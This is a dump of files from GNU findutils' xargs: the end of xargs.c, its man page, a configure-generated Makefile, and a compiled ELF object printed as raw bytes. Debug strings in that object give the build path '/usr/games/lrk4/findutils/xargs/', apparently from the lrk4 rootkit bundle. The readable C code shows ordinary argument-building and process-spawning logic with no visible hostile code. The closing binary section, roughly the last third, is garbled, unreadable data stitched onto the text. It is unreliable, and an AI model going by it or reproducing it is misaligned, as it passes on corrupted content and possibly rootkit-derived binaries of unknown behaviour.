   Return -1 if eof (either physical or logical) is reached,
   otherwise the length of the last string read (including the null).  */

static int
read_line ()
{
  static boolean eof = false;
  /* Start out in mode SPACE to always strip leading spaces (even with -i).  */
  int state = SPACE;		/* The type of character we last read.  */
  int prevc;			/* The previous value of c.  */
  int quotc = 0;		/* The last quote character read.  */
  int c = EOF;
  boolean first = true;		/* true if reading first arg on line.  */
  int len;
  char *p = linebuf;
  /* Including the NUL, the args must not grow past this point.  */
  char *endbuf = linebuf + arg_max - initial_argv_chars - 1;

  if (eof)
    return -1;
  while (1)
    {
      prevc = c;
      c = getc (stdin);
      if (c == EOF)
	{
	  /* COMPAT: SYSV seems to ignore stuff on a line that
	     ends without a \n; we don't.  */
	  eof = true;
	  if (p == linebuf)
	    return -1;
	  *p++ = '\0';
	  len = p - linebuf;
	  /* FIXME we don't check for unterminated quotes here.  */
	  if (first && EOF_STR (linebuf))
	    return -1;
	  if (!replace_pat)
	    push_arg (linebuf, len);
	  return len;
	}
      switch (state)
	{
	case SPACE:
	  if (ISSPACE (c))
	    continue;
	  state = NORM;
	  /* aaahhhh....  */

	case NORM:
	  if (c == '\n')
	    {
	      if (!ISBLANK (prevc))
		lineno++;	/* For -l.  */
	      if (p == linebuf)
		{
		  /* Blank line.  */
		  state = SPACE;
		  continue;
		}
	      *p++ = '\0';
	      len = p - linebuf;
	      if (EOF_STR (linebuf))
		{
		  eof = true;
		  return first ? -1 : len;
		}
	      if (!replace_pat)
		push_arg (linebuf, len);
	      return len;
	    }
	  if (!replace_pat && ISSPACE (c))
	    {
	      *p++ = '\0';
	      len = p - linebuf;
	      if (EOF_STR (linebuf))
		{
		  eof = true;
		  return first ? -1 : len;
		}
	      push_arg (linebuf, len);
	      p = linebuf;
	      state = SPACE;
	      first = false;
	      continue;
	    }
	  switch (c)
	    {
	    case '\\':
	      state = BACKSLASH;
	      continue;

	    case '\'':
	    case '"':
	      state = QUOTE;
	      quotc = c;
	      continue;
	    }
	  break;

	case QUOTE:
	  if (c == '\n')
	    error (1, 0, "unmatched %s quote",
		   quotc == '"' ? "double" : "single");
	  if (c == quotc)
	    {
	      state = NORM;
	      continue;
	    }
	  break;

	case BACKSLASH:
	  state = NORM;
	  break;
	}
      if (p >= endbuf)
	error (1, 0, "argument line too long");
      *p++ = c;
    }
}

/* Read a null-terminated string from stdin and add it to the list of
   arguments to pass to the command.
   Return -1 if eof (either physical or logical) is reached,
   otherwise the length of the string read (including the null).  */

static int
read_string ()
{
  static boolean eof = false;
  int len;
  char *p = linebuf;
  /* Including the NUL, the args must not grow past this point.  */
  char *endbuf = linebuf + arg_max - initial_argv_chars - 1;

  if (eof)
    return -1;
  while (1)
    {
      int c = getc (stdin);
      if (c == EOF)
	{
	  eof = true;
	  if (p == linebuf)
	    return -1;
	  *p++ = '\0';
	  len = p - linebuf;
	  if (!replace_pat)
	    push_arg (linebuf, len);
	  return len;
	}
      if (c == '\0')
	{
	  lineno++;		/* For -l.  */
	  *p++ = '\0';
	  len = p - linebuf;
	  if (!replace_pat)
	    push_arg (linebuf, len);
	  return len;
	}
      if (p >= endbuf)
	error (1, 0, "argument line too long");
      *p++ = c;
    }
}

/* Replace all instances of `replace_pat' in ARG with `linebuf',
   and add the resulting string to the list of arguments for the command
   to execute.
   ARGLEN is the length of ARG, not including the null.
   LBLEN is the length of `linebuf', not including the null.

   COMPAT: insertions on the SYSV version are limited to 255 chars per line,
   and a max of 5 occurences of replace_pat in the initial-arguments.
   Those restrictions do not exist here.  */

static void
do_insert (arg, arglen, lblen)
     char *arg;
     size_t arglen;
     size_t lblen;
{
  /* Temporary copy of each arg with the replace pattern replaced by the
     real arg.  */
  static char *insertbuf;
  char *p;
  int bytes_left = arg_max - 1;	/* Bytes left on the command line.  */

  if (!insertbuf)
    insertbuf = (char *) xmalloc (arg_max + 1);
  p = insertbuf;

  do
    {
      size_t len;		/* Length in ARG before `replace_pat'.  */
      char *s = strstr (arg, replace_pat);
      if (s)
	len = s - arg;
      else
	len = arglen;
      bytes_left -= len;
      if (bytes_left <= 0)
	break;

      strncpy (p, arg, len);
      p += len;
      arg += len;

      if (s)
	{
	  bytes_left -= lblen;
	  if (bytes_left <= 0)
	    break;
	  strcpy (p, linebuf);
	  arg += rplen;
	  p += lblen;
	}
    }
  while (*arg);
  if (*arg)
    error (1, 0, "command too long");
  *p++ = '\0';
  push_arg (insertbuf, p - insertbuf);
}

/* Add ARG to the end of the list of arguments `cmd_argv' to pass
   to the command.
   LEN is the length of ARG, including the terminating null.
   If this brings the list up to its maximum size, execute the command.  */

static void
push_arg (arg, len)
     char *arg;
     size_t len;
{
  if (arg)
    {
      if (cmd_argv_chars + len > arg_max)
	{
	  if (initial_args || cmd_argc == initial_argc)
	    error (1, 0, "can not fit single argument within argument list size limit");
	  if (replace_pat
	      || (exit_if_size_exceeded &&
		  (lines_per_exec || args_per_exec)))
	    error (1, 0, "argument list too long");
	  do_exec ();
	}
      if (!initial_args && args_per_exec &&
	  cmd_argc - initial_argc == args_per_exec)
	do_exec ();
    }

  if (cmd_argc >= cmd_argv_alloc)
    {
      if (!cmd_argv)
	{
	  cmd_argv_alloc = 64;
	  cmd_argv = (char **) xmalloc (sizeof (char *) * cmd_argv_alloc);
	}
      else
	{
	  cmd_argv_alloc *= 2;
	  cmd_argv = (char **) xrealloc (cmd_argv,
					 sizeof (char *) * cmd_argv_alloc);
	}
    }

  if (!arg)
    cmd_argv[cmd_argc++] = NULL;
  else
    {
      cmd_argv[cmd_argc++] = argbuf + cmd_argv_chars;
      strcpy (argbuf + cmd_argv_chars, arg);
      cmd_argv_chars += len;
    }
}

/* Print the arguments of the command to execute.
   If ASK is nonzero, prompt the user for a response, and
   if the user responds affirmatively, return true;
   otherwise, return false.  */

static boolean
print_args (ask)
     boolean ask;
{
  int i;

  for (i = 0; i < cmd_argc - 1; i++)
    fprintf (stderr, "%s ", cmd_argv[i]);
  if (ask)
    {
      static FILE *tty_stream;
      int c, savec;

      if (!tty_stream)
	{
	  tty_stream = fopen ("/dev/tty", "r");
	  if (!tty_stream)
	    error (1, errno, "/dev/tty");
	}
      fputs ("?...", stderr);
      fflush (stderr);
      c = savec = getc (tty_stream);
      while (c != EOF && c != '\n')
	c = getc (tty_stream);
      if (savec == 'y' || savec == 'Y')
	return true;
    }
  else
    putc ('\n', stderr);

  return false;
}

/* Execute the command that has been built in `cmd_argv'.  This may involve
   waiting for processes that were previously executed.  */

static void
do_exec ()
{
  pid_t child;

  push_arg ((char *) NULL, 0);	/* Null terminate the arg list.  */
  if (!query_before_executing || print_args (true))
    {
      if (proc_max && procs_executing >= proc_max)
	wait_for_proc (false);
      if (!query_before_executing && print_command)
	print_args (false);
      /* If we run out of processes, wait for a child to return and
         try again.  */
      while ((child = fork ()) < 0 && errno == EAGAIN && procs_executing)
	wait_for_proc (false);
      switch (child)
	{
	case -1:
	  error (1, errno, "cannot fork");

	case 0:		/* Child.  */
	  execvp (cmd_argv[0], cmd_argv);
	  error (0, errno, "%s", cmd_argv[0]);
	  _exit (errno == ENOENT ? 127 : 126);
	}
      add_proc (child);
    }

  cmd_argc = initial_argc;
  cmd_argv_chars = initial_argv_chars;
}

/* Add the process with id PID to the list of processes that have
   been executed.  */

static void
add_proc (pid)
     pid_t pid;
{
  int i;

  /* Find an empty slot.  */
  for (i = 0; i < pids_alloc && pids[i]; i++)
    ;
  if (i == pids_alloc)
    {
      if (pids_alloc == 0)
	{
	  pids_alloc = proc_max ? proc_max : 64;
	  pids = (pid_t *) xmalloc (sizeof (pid_t) * pids_alloc);
	}
      else
	{
	  pids_alloc *= 2;
	  pids = (pid_t *) xrealloc (pids,
				     sizeof (pid_t) * pids_alloc);
	}
      memset (&pids[i], '\0', sizeof (pid_t) * (pids_alloc - i));
    }
  pids[i] = pid;
  procs_executing++;
  procs_executed++;
}

/* If ALL is true, wait for all child processes to finish;
   otherwise, wait for one child process to finish.
   Remove the processes that finish from the list of executing processes.  */

static void
wait_for_proc (all)
     boolean all;
{
  while (procs_executing)
    {
      int i, status;

      do
	{
	  pid_t pid;

	  pid = wait (&status);
	  if (pid < 0)
	    error (1, errno, "error waiting for child process");

	  /* Find the entry in `pids' for the child process
	     that exited.  */
	  for (i = 0; i < pids_alloc && pid != pids[i]; i++)
	    ;
	}
      while (i == pids_alloc);	/* A child died that we didn't start? */

      /* Remove the child from the list.  */
      pids[i] = 0;
      procs_executing--;

      if (WEXITSTATUS (status) == 126 || WEXITSTATUS (status) == 127)
	exit (WEXITSTATUS (status));	/* Can't find or run the command.  */
      if (WEXITSTATUS (status) == 255)
	error (124, 0, "%s: exited with status 255; aborting", cmd_argv[0]);
      if (WIFSTOPPED (status))
	error (125, 0, "%s: stopped by signal %d", cmd_argv[0], WSTOPSIG (status));
      if (WIFSIGNALED (status))
	error (125, 0, "%s: terminated by signal %d", cmd_argv[0], WTERMSIG (status));
      if (WEXITSTATUS (status) != 0)
	child_error = 123;

      if (!all)
	break;
    }
}

/* Return the value of the number represented in STR.
   OPTION is the command line option to which STR is the argument.
   If the value does not fall within the boundaries MIN and MAX,
   Print an error message mentioning OPTION and exit.  */

static long
parse_num (str, option, min, max)
     char *str;
     int option;
     long min;
     long max;
{
  char *eptr;
  long val;

  val = strtol (str, &eptr, 10);
  if (eptr == str || *eptr)
    {
      fprintf (stderr, "%s: invalid number for -%c option\n",
	       program_name, option);
      usage (stderr, 1);
    }
  else if (val < min)
    {
      fprintf (stderr, "%s: value for -%c option must be >= %ld\n",
	       program_name, option, min);
      usage (stderr, 1);
    }
  else if (max >= 0 && val > max)
    {
      fprintf (stderr, "%s: value for -%c option must be < %ld\n",
	       program_name, option, max);
      usage (stderr, 1);
    }
  return val;
}

/* Return how much of ARG_MAX is used by the environment.  */

static long
env_size (envp)
     char **envp;
{
  long len = 0;

  while (*envp)
    len += strlen (*envp++) + 1;

  return len;
}

static void
usage (stream, status)
     FILE *stream;
     int status;
{
  fprintf (stream, "\
Usage: %s [-0prtx] [-e[eof-str]] [-i[replace-str]] [-l[max-lines]]\n\
       [-n max-args] [-s max-chars] [-P max-procs] [--null] [--eof[=eof-str]]\n\
       [--replace[=replace-str]] [--max-lines[=max-lines]] [--interactive]\n\
       [--max-chars=max-chars] [--verbose] [--exit] [--max-procs=max-procs]\n\
       [--max-args=max-args] [--no-run-if-empty] [--version] [--help]\n\
       [command [initial-arguments]]\n",
	   program_name);
  exit (status);
}
.TH XARGS 1L \" -*- nroff -*-
.SH NAME
xargs \- build and execute command lines from standard input
.SH SYNOPSIS
.B xargs
[\-0prtx] [\-e[eof-str]] [\-i[replace-str]] [\-l[max-lines]]
[\-n max-args] [\-s max-chars] [\-P max-procs] [\-\-null] [\-\-eof[=eof-str]]
[\-\-replace[=replace-str]] [\-\-max-lines[=max-lines]] [\-\-interactive]
[\-\-max-chars=max-chars] [\-\-verbose] [\-\-exit] [\-\-max-procs=max-procs]
[\-\-max-args=max-args] [\-\-no-run-if-empty] [\-\-version] [\-\-help]
[command [initial-arguments]]
.SH DESCRIPTION
This manual page
documents the GNU version of
.BR xargs .
.B xargs
reads arguments from the standard input, delimited by blanks (which can be
protected with double or single quotes or a backslash) or newlines,
and executes the
.I command
(default is /bin/echo) one or more times with any
.I initial-arguments
followed by arguments read from standard input.  Blank lines on the
standard input are ignored.
.P
.B xargs
exits with the following status:
.nf
0 if it succeeds
123 if any invocation of the command exited with status 1-125
124 if the command exited with status 255
125 if the command is killed by a signal
126 if the command cannot be run
127 if the command is not found
1 if some other error occurred.
.fi
.SS OPTIONS
.TP
.I "\-\-null, \-0"
Input filenames are terminated by a null character instead of by
whitespace, and the quotes and backslash are not special (every
character is taken literally).  Disables the end of file string, which
is treated like any other argument.  Useful when arguments might
contain white space, quote marks, or backslashes.  The GNU find
\-print0 option produces input suitable for this mode.
.TP
.I "\-\-eof[=eof-str], \-e[eof-str]"
Set the end of file string to \fIeof-str\fR.  If the end of file
string occurs as a line of input, the rest of the input is ignored.
If \fIeof-str\fR is omitted, there is no end of file string.  If this
option is not given, the end of file string defaults to "_".
.TP
.I "\-\-help"
Print a summary of the options to
.B xargs
and exit.
.TP
.I "\-\-replace[=replace-str], \-i[replace-str]"
Replace occurences of \fIreplace-str\fR in the initial arguments with
names read from standard input.
Also, unquoted blanks do not terminate arguments.
If \fIreplace-str\fR is omitted, it
defaults to "{}" (like for `find \-exec').  Implies \fI\-x\fP and
\fI\-l 1\fP.
.TP
.I "\-\-max-lines[=max-lines], -l[max-lines]"
Use at most \fImax-lines\fR nonblank input lines per command line;
\fImax-lines\fR defaults to 1 if omitted.  Trailing blanks cause an
input line to be logically continued on the next input line.  Implies
\fI\-x\fR.
.TP
.I "\-\-max-args=max-args, \-n max-args"
Use at most \fImax-args\fR arguments per command line.  Fewer than
\fImax-args\fR arguments will be used if the size (see the \-s option)
is exceeded, unless the \-x option is given, in which case \fBxargs\fR
will exit.
.TP
.I "\-\-interactive, \-p"
Prompt the user about whether to run each command line and read a line
from the terminal.  Only run the command line if the response starts
with `y' or `Y'.  Implies \fI\-t\fR.
.TP
.I "\-\-no-run-if-empty, \-r"
If the standard input does not contain any nonblanks, do not run the
command.  Normally, the command is run once even if there is no input.
.TP
.I "\-\-max-chars=max-chars, \-s max-chars"
Use at most \fImax-chars\fR characters per command line, including the
command and initial arguments and the terminating nulls at the ends of
the argument strings.  The default is as large as possible, up to 20k
characters.
.TP
.I "\-\-verbose, \-t"
Print the command line on the standard error output before executing
it.
.TP
.I "\-\-version"
Print the version number of
.B xargs
and exit.
.TP
.I "\-\-exit, \-x"
Exit if the size (see the \fI\-s\fR option) is exceeded.
.TP
.I "\-\-max-procs=max-procs, \-P max-procs"
Run up to \fImax-procs\fR processes at a time; the default is 1.  If
\fImax-procs\fR is 0, \fBxargs\fR will run as many processes as
possible at a time.  Use the \fI\-n\fR option with \fI\-P\fR;
otherwise chances are that only one exec will be done.
.SH "SEE ALSO"
\fBfind\fP(1L), \fBlocate\fP(1L), \fBlocatedb\fP(5L), \fBupdatedb\fP(1)
\fBFinding Files\fP (on-line in Info, or printed)
# Generated automatically from Makefile.in by configure.
# Makefile.in generated automatically by automake from Makefile.am.
# Copyright (C) 1994 Free Software Foundation, Inc.

# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2, or (at your option)
# any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.

SHELL = /bin/sh

srcdir = .
top_srcdir = ..
prefix = /usr/local
exec_prefix = ${prefix}

bindir = $(exec_prefix)/bin
sbindir = $(exec_prefix)/sbin
libexecdir = $(exec_prefix)/libexec
datadir = $(prefix)/share
sysconfdir = $(prefix)/etc
sharedstatedir = $(prefix)/com
localstatedir = $(prefix)/var
libdir = $(exec_prefix)/lib
infodir = $(prefix)/info
mandir = $(prefix)/man
includedir = $(prefix)/include
oldincludedir = /usr/include

INSTALL = /usr/bin/ginstall -c
INSTALL_PROGRAM = ${INSTALL}
INSTALL_DATA = ${INSTALL} -m 644
transform = s,x,x,

ALL = ${PROGRAMS} ${LIBPROGRAMS} ${SCRIPTS} ${LIBSCRIPTS} ${LIBFILES}
CC = gcc
LEX = @LEX@
YACC = @YACC@
ANSI2KNR = ./ansi2knr

DEFS = -DHAVE_CONFIG_H
CPPFLAGS = 
CFLAGS = -g -O
LDFLAGS = 
LIBS = 

xargs_SOURCES = xargs.c
xargs_OBJECTS = xargs.o
NROFF = nroff

SOURCES =  xargs.c
DIST_CONF = Makefile.am Makefile.in
DIST_FILES = $(DIST_CONF) $(SOURCES) $(TEXINFOS) $(INFOS) $(MANS) $(DIST_OTHER)

PROGRAMS = xargs
MANS = xargs.1
INCLUDES = -I.. -I$(top_srcdir)/lib
LDADD = ../find/version.o ../lib/libfind.a
CONFIG_HEADER = ../config.h

all:: ${ALL}

.c.o:
	$(CC) -c $(DEFS) $(INCLUDES) $(CPPFLAGS) $(CFLAGS) $<

$(xargs_OBJECTS): ../config.h
install:: install-programs

install-programs: $(PROGRAMS) $(SCRIPTS)
	$(top_srcdir)/mkinstalldirs $(bindir)
	for p in $(PROGRAMS) $(SCRIPTS); do \
	  $(INSTALL_PROGRAM) $$p $(bindir)/`echo $$p|sed '$(transform)'`; \
	done

uninstall:: uninstall-programs

uninstall-programs:
	for p in $(PROGRAMS) $(SCRIPTS); do \
	  rm -f $(bindir)/`echo $$p|sed '$(transform)'`; \
	done

xargs: $(xargs_OBJECTS)
	$(CC) -o $@ $(xargs_OBJECTS) $(LDADD) $(LDFLAGS) $(LIBS)

install:: install-man

install-man:
	for man in $(MANS); do \
	  sect=`echo $$man|sed 's%.*\.\([0-9][a-z]*\)$$%\1%'`; \
	  inst=`basename $$man $$sect|sed '$(transform)'`$$sect; \
	  mdir=$(mandir)/man$$sect; \
	  $(top_srcdir)/mkinstalldirs $$mdir; \
	  echo installing $$man as $$mdir/$$inst; \
	  $(INSTALL_DATA) $(srcdir)/$$man $$mdir/$$inst; \
	  cdir=$(mandir)/cat$$sect; \
	  if test -d $$cdir; then \
	    echo formatting $$man as $$cdir/$$inst; \
	    $(NROFF) -man $(srcdir)/$$man > $$cdir/$$inst; \
	  fi; \
	done

uninstall:: uninstall-man

uninstall-man:
	for man in $(MANS); do \
	  sect=`echo $$man|sed 's%.*\(\.[0-9][a-z]*\)$$%\1%'; \
	  inst=`basename $$man $sect|sed '$(transform)'`.$$sect; \
	  mdir=$(mandir)/man$$sect; \
	  cdir=$(mandir)/cat$$sect; \
	  rm -f $$mdir/$$inst $$cdir/$$inst; \
	done

mostlyclean:
	rm -f *.o core

clean: mostlyclean
	rm -f $(PROGRAMS) $(LIBPROGRAMS) $(LIBFILES) $(TEXFILES) $(CLEANFILES)

distclean: clean
	rm -f Makefile *.tab.c $(DISTCLEANFILES)
	rm -f config.cache config.log config.status ${CONFIG_HEADER} stamp-h

realclean: distclean
	rm -f TAGS $(INFOS)

dist: $(DIST_FILES) $(DIST_DIRS)
	-mkdir ../`cat ../distname`/$(subdir)
	@for file in $(DIST_FILES); do \
	  echo linking $$file; \
	  ln $(srcdir)/$$file ../`cat ../distname`/$(subdir)/$$file || \
	    { echo copying $$file instead; cp -p $(srcdir)/$$file ../`cat ../distname`/$(subdir)/$$file;}; \
	done

check dvi info install uninstall::

tags:: TAGS

TAGS::
	cd $(srcdir); etags $(SOURCES)

# Tell versions [3.59,3.63) of GNU make to not export all variables.
# Otherwise a system limit (for SysV at least) may be exceeded.
.NOEXPORT:

$(PROGRAMS): ../find/version.o ../lib/libfind.a

xargs.o: ../lib/wait.h
ELF                      Q      4     (   UWVS   ER  Ed  E           P      Q     )   h\  j jj h   h~  MQEP  H  $   6  L  L  L  L  L  L  L  L  L  L  L  L  L  L  L  L  L  L  L  L  L  L  L  L  L  L  L  L  L  L  L    L  L  L  L  L  L  L  L  L  L  L  L  L  L  L  L  L  L  L  L    L  L      L  L  D  L    L    L        L  4  L    Eh  =     t       |       mj h      =     t       
                   %=     tjjjl    PR     
                    jjjn    P                   6Sjjs    P     v       yT      P      _v 1Ujj jP    P  8   66    Ph  j jh    8  =    u	=    t
      M9    u        E   EE   @P      @P   j j=       M9    }806    MQR      E9    |4       $   ,   (   0   6Mt(=    t    9   E          $   9,   u   =<            EEP    9]~!0v M<IC9]0=   H   6EtL    BREP  O    C9]~WQEP  C9]]  v j%	  L   P6UWVS   E    E   5      U0   )UM=X       ]   9   wh    v       uuX      95   t9 F+5   } t3=    t*      8uSQu
   =       V   P     6t#	tL            X
C1
       UPu    95   u   6 F+5   =    tA      8u/SQu!X      } ,  %  =    uV   P  =    u{    Xu
tCvu^ F+5   =    t$   =   8uWQjV   PW  5      E    't	"tX6\uQ      ]v 
u"  }"u  Ph  j j9]u
1y19uwh  j jFV6e[^_]6UWVS   =   +=0   O=\    uE   9   wh    6   0   u\      9   uTu,     C+   =    uS   P  'v 9rh  j jCcv e[^_]6UWVSu   JU=     u   @P    =    v    PVE]t))]} ~>SVW} t$U)U} ~   PW5   }> u> th  j j G+    P    P
   e[^_]UWVS]u   (   9   sa=4    u$   9,   uh  j j=    u=    t#=    u	=    th2  j j  =4    u!=    t$   +,   9   u  $   9    N=    u    @   h      '=        P   P   u$          $   -$         (   $   SQ5(   e[^_]US1   PhI  h    C$   H9|}    =    u0hM  hO     uhO      Pjh    hX  h       B9BwR   P@t6v 
t.   B9BwR   P@uytYu1   ,   9   wj
h        
   1]]Uj j \=T    tj   =8    t@   98   
j   =T    u=P    tj e6}=    u=@    t	j J  tt]h]      Pj   P P    Phi      Pj ~   =    u   Pv P   ,   $   0   (   ]6UVSu19H   ~D   < t	C9H   9H   usu)8   u@   H   PD   )v H   H   PD   PD   H   )Pj     D   PD   4@   <   e[^]UVSu=@      EP}hl      Pj19H   ~D   69t	B9H   9H   tD       @   E~tu
EPE=   u    Ph  j j|E<u"%   P    Ph  j j}UBf= wP    Ph  j j}} t
L   {   t=@    e[^]6UWVS]uEj j
PS9]tE8 tUR    Ph  h    @69}~URUR    Ph	  6|*9~&VUR    Ph2  h    jh    J   e[^_]6UWSU1: t6:0M: ue[_]6USE]    RhZ  PS6                                                                                                       01.01          	   <          d       9   d       A          c          u                                                 [         y                                                               ?         Z         v                     v                                A         g            .        1        4        
                             )        ;        M        c        u                                                                        *   %     Z        e        n        w                                                   	        
                                                                                     !        +   $     6   )     C   .     M   3     X   8     d   <     o   =     z   >        ?        B        C        D        E                          N        O     (   P     3   Q     @   R     K   S     X   V     c   W     p        {                                                                           "        #        '        (     &   )     2   *     @   +     N   ,     [   -     n   2     |   3        4        5        6        7        8        9              	         !	         f	         u	         	         	         
         >
         
         
         
         ?         T        a   L     j   M     t                                                              $     @   '     K   (     V   )     a   *     m   +     z   ,        -        .        /        0        =        >        ?        B        C                 P     (         `                                    *         ^                                    I         ~                           )         g                                    [                                               P     1         g            ,        .        B              ?         v                             3        :            3   #    G         y            v       &        &       &       &       &       &       &        &       &      #  &  $   /  &  (   A  &  ,   Q  &  0   g  &  4   w  &  8     &  <     &  @     &  D     &  H     &  L     &  P     &  T     &       $             &           D          D  	       D 	       D        D        D        D &       D +       D 5       D O       D V       D h       D        D       D       D !      D "      D $      D %      D (      D +      D ,      D .       D 0*      D 14      D 2>      D 5D      D 6M      D 8h      D :r      D ;|      D <      D ?      D A      D B      D C      D F      D G      D N      D O      D R      D S      D T      D W      D X      D [      D \*      D _4      D `D      D cL      D dX      D e[      D g`      D hr      D j|      D l      D m      D n      D q      D r      D u      D w      D y      D z      D y      D {      D |&      D }0      D :      D H      D ^      D c      D m      D p      D       D       D       D       D       D       D       D       D       D       D       D       D ,      D =      D F      D K      D P      D P      D W      D d  /  @     7  @    M  @    ]   l          	     @      @      @                    P         d    $ d      D         D 	       D 	       D        D        D        D !       D '       D >       D L       D O       D ~       D        D        D        D        D        D        D        D        D        D        D        D M      D O      D X      D f      D l      D t      D y      D       D       D       D       D       D       D       D       D       D       D       D       D I      D U      D [      D `      D g      D p      D        D       D       D       D       D       D       D       D       D       D       D       D       D       D       D     & X     @            @         @      @              	              $ 'h      D '        D (       D *       D ,       D .       D 2$       D 3R       D 5W       D 6a       D 7i       D >p       D @t       D Az       D B~       D C       D D       D E       D G       D H       D I       D J       D K     & (\     @ )     @ *     @ ,               @ 2          $                         $ Y8	  ,   Y   4   Z   >   [       D \        D _       D a       D c       D d       D e3       D i<       D j<       D kK       D nN       D kQ       D lU       D oY       D p\       D sb       D tj       D ul       D wn       D yw       D z}       D |       D }       D ~       D        D        D        D        D        D        D        D    G  @ Y   O  ( _    ]  @ `   c   a          p  @ i   w   j       <                       |  $ 
                  D         D        D        D $       D :       D K       D o       D        D        D        D        D        D        D        D        D        D        D       D 
      D       D (      D H      D O      D U    @      @      $ p            D         D        D        D        D         D .       D 8       D 8       D A       D U       D \       D q       D        D        D        D        D        D        D       D       D .      D 0    @                (      @      @           8                   0    $       D         D        D        D        D *       D @       D J       D \       D f       D        D        D        D        D        D        D        D        D       D     @                          $             D         D        D        D '       D /       D 3       D F       D T       D \       D k       D        D        D !       D "       D #       D $     @      @                          $ ,|  )   ,       D -        D .       D 0       D 4       D 6       D 7#       D 8*       D <?       D >^       D ?^       D Bf       D Cr       D Ex       D F       D G       D H       D I       D J       D K       D L       D M      D N      D P      D R      D S)  0  @ ,             7  @ 0   <   0          E  @ 4                    ^          x          x                                                               L  @ I                                            o  @ K                                                                             )    $ \     \      ]      ^      _       D `        D a       D d              D                D e"       D g/       D jH       D kL       D mQ       D pd       D qh       D sp       D u       D w       D x     @ \     @ _      a  @ b               @ d                    "               $ ~T     ~       D         D        D        D        D /       D 1     @ ~   $  @                     1   +  $   5      @          D         D 
       D        D $   J  @     U  @    _         p  (     |  (       (         d      xargs.c gcc2_compiled. /usr/games/lrk4/findutils/xargs/ xargs.c int:t1=r1;-2147483648;2147483647; char:t2=r2;0;127; long int:t3=r1;-2147483648;2147483647; unsigned int:t4=r1;0;-1; long unsigned int:t5=r1;0;-1; long long int:t6=r1;01000000000000000000000;0777777777777777777777; long long unsigned int:t7=r1;0000000000000;01777777777777777777777; short int:t8=r1;-32768;32767; short unsigned int:t9=r1;0;65535; signed char:t10=r1;-128;127; unsigned char:t11=r1;0;255; float:t12=r1;4;0; double:t13=r1;8;0; long double:t14=r1;12;0; complex int:t15=s8real:1,0,32;imag:1,32,32;; complex float:t16=r16;4;0; complex double:t17=r17;8;0; complex long double:t18=r18;12;0; void:t19=19 __long_double_t:t14  :T20=e_ISupper:256,_ISlower:512,_ISalpha:1024,\ _ISdigit:2048,_ISxdigit:4096,_ISspace:8192,\ _ISprint:16384,_ISgraph:32768,_ISblank:1,\ _IScntrl:2,_ISpunct:4,_ISalnum:3072,; fd_set:T21=s128fds_bits:22=ar1;0;31;5,0,1024;; __kernel_fd_set:t21 __kernel_sighandler_t:t23=*24=f19 __kernel_key_t:t1 __kernel_dev_t:t9 __kernel_ino_t:t5 __kernel_mode_t:t9 __kernel_nlink_t:t9 __kernel_off_t:t3 __kernel_pid_t:t1 __kernel_ipc_pid_t:t9 __kernel_uid_t:t9 __kernel_gid_t:t9 __kernel_size_t:t4 __kernel_ssize_t:t1 __kernel_ptrdiff_t:t1 __kernel_time_t:t3 __kernel_clock_t:t3 __kernel_daddr_t:t1 __kernel_caddr_t:t25=*2 __kernel_loff_t:t6 __kernel_fsid_t:t26=s8__val:27=ar1;0;1;1,0,64;; umode_t:t9 __s8:t10 __u8:t11 __s16:t8 __u16:t9 __s32:t1 __u32:t4 __s64:t6 __u64:t7 fd_set:t21 dev_t:t9 ino_t:t5 mode_t:t9 nlink_t:t9 off_t:t3 pid_t:t1 uid_t:t9 gid_t:t9 daddr_t:t1 key_t:t1 loff_t:t6 size_t:t4 ssize_t:t1 ptrdiff_t:t1 time_t:t3 clock_t:t3 caddr_t:t25 u_char:t11 u_short:t9 u_int:t4 u_long:t5 unchar:t11 ushort:t9 uint:t4 ulong:t5 ustat:T28=s20f_tfree:1,0,32;f_tinode:5,32,32;\ f_fname:29=ar1;0;5;2,64,48;f_fpack:29,112,48;; int8_t:t2 u_int8_t:t11 int16_t:t8 u_int16_t:t9 int32_t:t1 u_int32_t:t4 int64_t:t6 u_int64_t:t7 fd_mask:t5 _G_clock_t:t3 _G_dev_t:t9 _G_fpos_t:t3 _G_gid_t:t9 _G_ino_t:t5 _G_mode_t:t9 _G_nlink_t:t9 _G_off_t:t3 _G_pid_t:t1 _G_ptrdiff_t:t1 _G_sigset_t:t5 _G_size_t:t4 _G_time_t:t3 _G_uid_t:t9 _G_wchar_t:t3 _G_ssize_t:t1 _G_wint_t:t1 _G_va_list:t30=*19 _G_int8_t:t10 _G_uint8_t:t11 _G_int16_t:t8 _G_uint16_t:t9 _G_int32_t:t1 _G_uint32_t:t4 _G_int64_t:t6 _G_uint64_t:t7 _IO_lock_t:T31=s8ptr:30,0,32;field1:8,32,16;\ field2:8,48,16;; _IO_marker:T32=s12_next:33=*32,0,32;_sbuf:34=*35=xs_IO_FILE:,32,32;\ _pos:1,64,32;; _IO_FILE:T35=s80_flags:1,0,32;_IO_read_ptr:25,32,32;\ _IO_read_end:25,64,32;_IO_read_base:25,96,32;\ _IO_write_base:25,128,32;_IO_write_ptr:25,160,32;\ _IO_write_end:25,192,32;_IO_buf_base:25,224,32;\ _IO_buf_end:25,256,32;_IO_save_base:25,288,32;_IO_backup_base:25,320,32;\ _IO_save_end:25,352,32;_markers:33,384,32;_chain:34,416,32;\ _fileno:1,448,32;_blksize:1,480,32;_offset:3,512,32;\ _cur_column:9,544,16;_unused:2,560,8;_shortbuf:36=ar1;0;0;2,568,8;\ _IO_lock:31,576,64;; _IO_FILE:t35 FILE:t35 fpos_t:t3 option:T37=s16name:38=*2,0,32;has_arg:1,32,32;\ flag:39=*1,64,32;val:1,96,32;; __u_char:t11 __u_short:t9 __u_int:t4 __u_long:t5 __quad:t40=s8val:41=ar1;0;1;3,0,64;; __u_quad:t42=s8val:43=ar1;0;1;5,0,64;; __dev_t:t9 __gid_t:t9 __uid_t:t9 __mode_t:t9 __daddr_t:t3 __off_t:t3 __loff_t:t6 __ino_t:t5 __nlink_t:t9 __time_t:t3 __pid_t:t1 __ssize_t:t1 __fsid_t:t40 __caddr_t:t25 __swblk_t:t3 __fd_set:T44=s128fds_bits:22,0,1024;; __fd_set:t44  